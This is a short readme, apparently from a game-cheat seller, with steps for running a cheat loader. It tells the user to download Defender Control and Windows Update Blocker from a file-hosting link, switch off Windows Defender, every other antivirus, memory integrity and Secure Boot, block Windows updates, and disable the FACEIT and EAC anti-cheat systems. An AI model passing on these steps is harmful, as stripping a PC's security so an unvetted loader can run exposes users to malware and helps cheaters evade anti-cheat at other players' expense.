📌 Links:
staffbesting.store
discord.gg/staffbesting1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  MAIN STEPS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[  1  ] - Open the game.
[  2  ] - Run the loader.
[  3  ] - Click "Start Cheat" in the loader.
[  4  ] - Menu Key: Insert

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  NOTES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ▸ DOWNLOAD — Defender Control + Windows Update Blocker
          https://mega.nz/file/CpY0AL4C#Osn3jpeJZuUwWjKJdn3ZfM2WlaZl-pZPS8ZM_ff4KCA

  ▸ HVCI / MEMORY INTEGRITY  →  must be OFF
          Windows Security → Device security → Core isolation
          Memory integrity = Off  →  restart the PC

  ▸ DEFENDER / ANTIVIRUS  →  all OFF
          [  1  ] - Defender Control → click "Disable Windows Defender"
          [  2  ] - Turn off every other Antivirus completely
          [  3  ] - Windows Update Blocker → click "Apply Now"
          [  4  ] - Disable FACEIT and EAC Anti-Cheat
          [  5  ] - Install "All Runtimes" from the Requirements folder

  ▸ SECURE BOOT / TPM (Optional)  →  Secure Boot OFF
          [  1  ] - Restart the PC → enter BIOS/UEFI (Del, F2 or F10)
          [  2  ] - Go to Security (or Boot) → Secure Boot → Disabled
          [  3  ] - Save & Exit (F10) → the PC boots with Secure Boot OFF
          [  4  ] - Check in Windows: msinfo32 → Secure Boot State = Off
          TPM 2.0 is required on Windows 11 → check with tpm.msc.
